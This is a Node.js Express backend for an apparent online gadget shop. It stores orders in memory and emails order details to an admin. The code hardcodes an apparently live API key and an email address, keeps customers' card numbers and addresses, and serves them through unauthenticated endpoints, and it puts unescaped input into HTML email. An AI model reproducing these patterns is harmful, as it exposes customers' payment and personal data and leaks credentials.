const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');

const app = express();

// ====================== CONFIGURATION ======================
const ADMIN_EMAIL = 'kelvinberns1@gmail.com';       // Change to your email
const RESEND_API_KEY = 're_fmCDGVHD_J6Wb9uTMnPaGBQQpfsPYEzHV'; // Your Resend API key
const FROM_EMAIL = 'onboarding@resend.dev';        // Resend default sender

// Order expiration time (24 hours in milliseconds)
const ORDER_TTL_MS = 24 * 60 * 60 * 1000;

// In-memory order store: each order has { id, createdAt, ...rest }
let orders = [];

// ====================== MIDDLEWARE ======================
app.use(cors());
app.use(express.json());

// Optional: log all requests
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// ====================== ORDER CLEANUP (every hour) ======================
function deleteOldOrders() {
  const now = Date.now();
  const beforeCount = orders.length;
  orders = orders.filter(order => {
    const age = now - new Date(order.createdAt).getTime();
    return age < ORDER_TTL_MS;
  });
  const removed = beforeCount - orders.length;
  if (removed > 0) {
    console.log(`🧹 Cleaned up ${removed} old order(s) (>24h). ${orders.length} order(s) remaining.`);
  }
}
// Run cleanup every hour
setInterval(deleteOldOrders, 60 * 60 * 1000);
// Also run on startup
deleteOldOrders();

// ====================== RESEND EMAIL (optional) ======================
let resend;
if (RESEND_API_KEY && RESEND_API_KEY !== 'your_resend_api_key_here') {
  resend = new Resend(RESEND_API_KEY);
  console.log('📧 Resend email service initialized');
} else {
  console.log('⚠️  Resend API key missing – email notifications disabled');
}

async function sendOrderNotification(order) {
  if (!resend) return;

  // Build HTML email
  const items = order.cartItems || [];
  let itemsHtml = '';
  let total = 0;
  items.forEach(item => {
    const subtotal = item.price * item.quantity;
    total += subtotal;
    itemsHtml += `
      <tr>
        <td style="padding:8px; border-bottom:1px solid #ddd;">${item.name}</td>
        <td style="padding:8px; text-align:center;">${item.quantity}</td>
        <td style="padding:8px; text-align:right;">$${item.price.toFixed(2)}</td>
        <td style="padding:8px; text-align:right;">$${subtotal.toFixed(2)}</td>
      </tr>
    `;
  });
  if (items.length === 0 && order.amount) {
    total = order.amount;
    itemsHtml = `<tr><td colspan="4">${order.product || 'Order'}</td></tr>`;
  }

  const emailHtml = `
    <!DOCTYPE html>
    <html>
    <head><style>body{font-family:Inter, Arial;}</style></head>
    <body>
      <div style="background:linear-gradient(135deg,#00d4ff,#7c3aed); padding:20px; text-align:center; color:white;">
        <h2>🛒 New Order Received!</h2>
        <p>GadgetGalaxy</p>
      </div>
      <div style="padding:20px">
        <h3>Order #${order.id}</h3>
        <p><strong>Date:</strong> ${new Date(order.createdAt).toLocaleString()}</p>
        <p><strong>Payment:</strong> ${order.paymentMethod}</p>
        <p><strong>Customer:</strong> ${order.customerEmail}</p>
        ${order.airtmUsername ? `<p><strong>Airtm Username:</strong> ${order.airtmUsername}</p>` : ''}
        <h4>📦 Items</h4>
        <table style="width:100%; border-collapse:collapse;">
          <thead><tr><th>Product</th><th>Qty</th><th>Price</th><th>Subtotal</th></tr></thead>
          <tbody>${itemsHtml}</tbody>
          <tfoot><tr><td colspan="3"><strong>Total</strong></td><td><strong>$${total.toFixed(2)}</strong></td></tr></tfoot>
        </table>
        <h4>📍 Shipping</h4>
        <p>${order.shipping?.firstName} ${order.shipping?.lastName}<br>
        ${order.shipping?.address}<br>${order.shipping?.city}, ${order.shipping?.state} ${order.shipping?.zip}<br>
        ${order.shipping?.country}<br>📞 ${order.shipping?.phone}</p>
        ${order.cardDetails ? `<h4>💳 Card (POS)</h4><p>****${order.cardDetails.cardNumber?.slice(-4)}<br>Expiry ${order.cardDetails.expiry}<br>${order.cardDetails.cardholderName}</p>` : ''}
      </div>
    </body>
    </html>
  `;

  try {
    await resend.emails.send({
      from: FROM_EMAIL,
      to: ADMIN_EMAIL,
      subject: `🛒 New Order #${order.id} - $${total.toFixed(2)}`,
      html: emailHtml
    });
    console.log(`📧 Email sent for order #${order.id}`);
  } catch (err) {
    console.error(`❌ Email failed for #${order.id}:`, err.message);
  }
}

// ====================== API ENDPOINTS ======================

// Get all orders (non‑expired ones)
app.get('/api/orders', (req, res) => {
  // Sort by newest first
  const sorted = [...orders].sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json(sorted);
});

// Get single order
app.get('/api/order/:id', (req, res) => {
  const order = orders.find(o => o.id === req.params.id);
  if (order) return res.json(order);
  res.status(404).json({ error: 'Order not found' });
});

// Create new order (with automatic 24h expiration)
app.post('/api/order', async (req, res) => {
  const newOrder = {
    id: Date.now().toString(),               // simple unique ID
    createdAt: new Date().toISOString(),
    ...req.body,
    status: 'pending'
  };
  orders.push(newOrder);
  console.log(`\n✅ NEW ORDER #${newOrder.id} | Total: $${newOrder.totalAmount || newOrder.amount || 0} | Payment: ${newOrder.paymentMethod}`);

  // Send email notification (non-blocking)
  sendOrderNotification(newOrder).catch(console.error);

  res.status(201).json({ success: true, orderId: newOrder.id });
});

// Delete an order (manual removal)
app.delete('/api/order/:id', (req, res) => {
  const index = orders.findIndex(o => o.id === req.params.id);
  if (index !== -1) {
    const removed = orders.splice(index, 1);
    res.json({ success: true, deleted: removed[0] });
  } else {
    res.status(404).json({ error: 'Order not found' });
  }
});

// Health check / info
app.get('/', (req, res) => {
  res.json({
    name: 'GadgetGalaxy Order API',
    status: 'running',
    ordersStored: orders.length,
    retentionHours: 24,
    cleanupInterval: '1 hour',
    emailTo: ADMIN_EMAIL
  });
});

// ====================== START SERVER ======================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`\n🚀 Server running on port ${PORT}`);
  console.log(`📦 Orders will be automatically deleted after 24 hours`);
  console.log(`🧹 Cleanup runs every hour (${orders.length} orders currently stored)`);
  console.log(`📧 Admin email: ${ADMIN_EMAIL}`);
});
